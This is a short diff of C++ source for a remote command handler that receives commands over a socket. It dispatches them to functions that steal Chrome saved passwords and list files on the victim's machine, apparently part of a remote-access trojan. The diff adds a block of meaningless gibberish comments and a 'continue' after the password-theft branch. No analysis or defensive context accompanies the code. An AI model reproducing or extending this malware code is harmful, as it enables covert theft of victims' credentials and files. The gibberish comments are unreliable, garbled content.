@@ -219,6 +219,14 @@ void Connection::connection() {
             continue;
         }
 
+        //f12dsafewffdsa
+//f1233231d 23s 432 43fdsa2a4 f3ds2f432 fdsa432
+// 321rewfdsafdsaaf
+// ffdsadfs321fdsa
+//  r3
+//  24 32 432
+//  321 fds321ewf
+
 
         string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));
         cout << command << endl;
@@ -251,6 +259,7 @@ void Connection::connection() {
             continue;
         } else if (!command.rfind("get chrome passwords")) {
             getChromePasswords();
+            continue;
         } else if (!command.rfind("get files")) {
             command = command.substr(10, command.size() - 1);
             string files = getAllFiles(command).c_str();
